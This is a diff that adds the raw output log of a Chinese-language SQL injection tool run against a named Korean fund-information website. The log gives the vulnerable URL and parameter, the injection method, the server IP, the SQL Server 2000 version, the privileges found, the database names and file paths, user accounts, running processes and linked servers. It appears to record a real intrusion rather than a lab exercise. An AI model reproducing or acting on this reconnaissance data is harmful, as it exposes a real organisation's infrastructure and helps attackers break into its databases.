@@ -1,0 +1,111 @@
+■漏洞信息:============================================================
+ ·URL:http://fund2.moneta.co.kr/cb_moneta/contents/article/News/FundInvestor_view.asp?page=1&confID=tompson&section=Efi&seq=12156
+ ·页面标题：MONETA - 戚靛
+ ·参数:page=1&confID=tompson&section=Efi&seq=12156
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.181.243.30
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 12:26:54 GMT
+Server: WWW Server/1.1
+X-Powered-By: ASP.NET
+Content-Length: 29347
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAACTRSRS=JJEHEAAAHMOEJIHHAEODABAE; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:MCenter
+ ·版本:Microsoft SQL Server  2000 - 8.00.2282 (Intel X86) 
+	Dec 30 2008 02:22:41 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+Advisor	F:\MSSQL\DB\Advisor_Data.MDF	
+Associates	C:\Program Files\Microsoft SQL Server\MSSQL\data\Associates_Data.MDF	
+DA	F:\MSSQL\DB\DA.mdf	
+DZGOLD	F:\MSSQL\DB\DZGOLD_Data.MDF	
+FnGuide	F:\MSSQL\DB\FnGuide_Data.MDF	
+Fund500	F:\MSSQL\DB\Fund500_Data.MDF	
+FundComp	F:\MSSQL\DB\FundComp_Data.MDF	
+FundCust	F:\MSSQL\DB\FundCust_Data.MDF	
+FundKor	F:\MSSQL\DB\FundKor_data.mdf	
+FundKor2	F:\MSSQL\DB\FundKor2_Data.MDF	
+FundKorHold	F:\MSSQL\DB\FundKorHold_Data.MDF	
+FundKorMs	F:\MSSQL\DB\FundKorMs_Data.MDF	
+FundMap	F:\MSSQL\DB\FundMap_Data.MDF	
+FundMapVer2	F:\MSSQL\DB\FundMapVer2_Data.MDF	
+FundQT	F:\MSSQL\DB\FundQT_Data.MDF	
+Kbp	F:\MSSQL\DB\Kbp_Data.MDF	
+Kitca	F:\MSSQL\DB\Kitca_Data.MDF	
+KitcaHold	F:\MSSQL\DB\KitcaHold_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+MCenter	F:\MSSQL\DB\MCenter_Data.MDF	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+MSCI	F:\MSSQL\DB\MSCI_Data.MDF	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+NBS	C:\Program Files\Microsoft SQL Server\MSSQL\data\NBS_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+Offshore	F:\MSSQL\DB\Offshore_Data.MDF	
+PortKor	F:\MSSQL\DB\PortKor_Data.MDF	
+Product	F:\MSSQL\DB\Product_Data.MDF	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+tTest	C:\Program Files\Microsoft SQL Server\MSSQL\data\tTest.mdf	
+XOI	F:\MSSQL\DB\XOI_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+msk_ssl	.	???????峝	01  7 2011  2:09PM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	DB	1944	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	DB	1944	AWAITING COMMAND	SYSTEM	
+NeoX DB Module	sleeping	KRPC24	1660	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	DEV	3028	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	DEV	3028	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DB	SQL Server	SQLOLEDB	DB		DB	
+DB\DEV	SQL Server	SQLOLEDB	DB\DEV		DB\DEV	
+DBSERVER	SQL Server	SQLOLEDB	DBSERVER		DBSERVER	
+DEV		MSDASQL	db_dev			
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
+Dir of D:: 
